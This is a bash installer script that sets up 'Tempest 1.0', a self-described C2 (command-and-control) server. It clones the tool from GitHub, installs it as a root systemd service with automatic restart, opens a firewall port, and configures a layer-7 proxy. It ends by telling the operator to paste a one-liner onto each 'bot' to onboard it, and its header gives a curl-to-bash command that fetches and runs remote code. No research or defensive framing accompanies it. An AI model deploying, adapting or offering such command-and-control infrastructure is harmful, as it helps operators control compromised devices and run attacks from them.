#!/usr/bin/env bash
# ============================================================
#  Tempest 1.0 — C2 Server Installer
#  Supports: Ubuntu 20.04+ / Debian 11+
#
#  Usage (one command):
#    bash <(curl -fsSL https://raw.githubusercontent.com/moj-alabi/test/main/Tempest/install_server.sh)
#
#  Or after cloning:
#    cd test/Tempest && bash install_server.sh
# ============================================================
set -euo pipefail

REPO_URL="https://github.com/moj-alabi/test.git"
INSTALL_DIR="/opt/tempest"
SERVICE_NAME="tempest"
PORT="${PORT:-5000}"
PROXY_HOST="${L7_PROXY_HOST:-10.0.10.118}"
PROXY_PORT="${L7_PROXY_PORT:-3128}"

# ── Colours ────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
die()  { echo -e "${RED}[✗]${NC} $*" >&2; exit 1; }

echo -e "${BOLD}"
echo "  ████████╗███████╗███╗   ███╗██████╗ ███████╗███████╗████████╗"
echo "     ██╔══╝██╔════╝████╗ ████║██╔══██╗██╔════╝██╔════╝╚══██╔══╝"
echo "     ██║   █████╗  ██╔████╔██║██████╔╝█████╗  ███████╗   ██║"
echo "     ██║   ██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══╝  ╚════██║   ██║"
echo "     ██║   ███████╗██║ ╚═╝ ██║██║     ███████╗███████║   ██║"
echo "     ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝   ╚═╝"
echo -e "${NC}                     ${CYAN}Tempest 1.0 — C2 Server Installer${NC}\n"

# ── Root check ─────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    warn "Not running as root — some steps (systemd, ufw) may be skipped."
    warn "Re-run with: sudo bash install_server.sh"
    HAVE_ROOT=false
else
    HAVE_ROOT=true
fi

# ── Detect OS ──────────────────────────────────────────────
if [[ ! -f /etc/os-release ]]; then
    die "Cannot detect OS. This installer supports Ubuntu/Debian only."
fi
. /etc/os-release
info "Detected OS: ${PRETTY_NAME}"

# ── Install dependencies ───────────────────────────────────
info "Installing system packages..."
if $HAVE_ROOT; then
    apt-get update -qq
    apt-get install -y -qq python3 python3-pip git curl 2>/dev/null
else
    warn "Skipping apt-get (no root). Ensure python3 and git are installed."
fi

# Verify python3 is available
python3 --version >/dev/null 2>&1 || die "python3 not found. Install it with: sudo apt-get install python3"
log "Python: $(python3 --version)"

# ── Clone / update repo ────────────────────────────────────
if [[ -d "$INSTALL_DIR/.git" ]]; then
    info "Updating existing installation at $INSTALL_DIR..."
    git -C "$INSTALL_DIR" pull --ff-only 2>/dev/null || warn "git pull failed — continuing with existing files"
elif [[ -d "$INSTALL_DIR" ]]; then
    warn "$INSTALL_DIR exists but is not a git repo — using as-is"
else
    # Check if we're already running from the repo (cloned manually)
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
    if [[ -f "$SCRIPT_DIR/server.py" ]]; then
        info "Running from local repo at $SCRIPT_DIR"
        INSTALL_DIR="$SCRIPT_DIR"
    else
        info "Cloning Tempest to $INSTALL_DIR..."
        if $HAVE_ROOT; then
            git clone --depth 1 "$REPO_URL" /opt/tempest_repo
            INSTALL_DIR="/opt/tempest_repo/Tempest"
        else
            git clone --depth 1 "$REPO_URL" "$HOME/tempest_repo"
            INSTALL_DIR="$HOME/tempest_repo/Tempest"
        fi
    fi
fi

# Make sure server.py is present
[[ -f "$INSTALL_DIR/server.py" ]] || die "server.py not found in $INSTALL_DIR"
log "Install dir: $INSTALL_DIR"

# ── Resolve server IP for display ─────────────────────────
SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}') || SERVER_IP="<this-server>"

# ── Create systemd service ─────────────────────────────────
if $HAVE_ROOT && command -v systemctl >/dev/null 2>&1; then
    PYTHON_BIN=$(command -v python3)
    cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Tempest 1.0 C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
Environment="PORT=${PORT}"
Environment="L7_PROXY_HOST=${PROXY_HOST}"
Environment="L7_PROXY_PORT=${PROXY_PORT}"
ExecStart=${PYTHON_BIN} ${INSTALL_DIR}/server.py
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" --quiet
    systemctl restart "$SERVICE_NAME"

    # Wait for it to start
    sleep 2
    if systemctl is-active --quiet "$SERVICE_NAME"; then
        log "systemd service '${SERVICE_NAME}' is running"
    else
        warn "Service may have failed to start. Check: journalctl -u ${SERVICE_NAME} -n 30"
    fi
else
    warn "Skipping systemd setup (no root or systemctl not available)."
    warn "Starting Tempest in the background instead..."
    LOGFILE="/tmp/tempest.log"
    nohup python3 "$INSTALL_DIR/server.py" > "$LOGFILE" 2>&1 &
    BGPID=$!
    sleep 2
    if kill -0 $BGPID 2>/dev/null; then
        log "Tempest started (PID $BGPID) — logs: $LOGFILE"
    else
        die "Tempest failed to start. Check $LOGFILE"
    fi
fi

# ── Open firewall port ─────────────────────────────────────
if $HAVE_ROOT && command -v ufw >/dev/null 2>&1; then
    UFW_STATUS=$(ufw status 2>/dev/null | head -1)
    if [[ "$UFW_STATUS" == "Status: active" ]]; then
        ufw allow "$PORT"/tcp >/dev/null 2>&1 && log "ufw: opened port $PORT/tcp"
    fi
fi

# ── Done ───────────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}${GREEN}║         Tempest 1.0 installed successfully       ║${NC}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${BOLD}Dashboard:${NC}   http://${SERVER_IP}:${PORT}"
echo -e "  ${BOLD}Install dir:${NC} ${INSTALL_DIR}"
echo -e "  ${BOLD}Logs:${NC}        journalctl -u ${SERVICE_NAME} -f"
echo ""
echo -e "  ${CYAN}To onboard a device, go to:${NC}"
echo -e "  ${BOLD}Devices → Onboard Device${NC} and paste the one-liner on your bot"
echo ""
echo -e "  ${YELLOW}Proxy config:${NC} ${PROXY_HOST}:${PROXY_PORT}"
echo -e "  ${YELLOW}Override:${NC}    L7_PROXY_HOST=x L7_PROXY_PORT=y PORT=5000 python3 server.py"
echo ""

if $HAVE_ROOT && command -v systemctl >/dev/null 2>&1; then
    echo -e "  ${CYAN}Service commands:${NC}"
    echo -e "    systemctl status  ${SERVICE_NAME}"
    echo -e "    systemctl restart ${SERVICE_NAME}"
    echo -e "    systemctl stop    ${SERVICE_NAME}"
    echo -e "    journalctl -u ${SERVICE_NAME} -f"
fi
echo ""
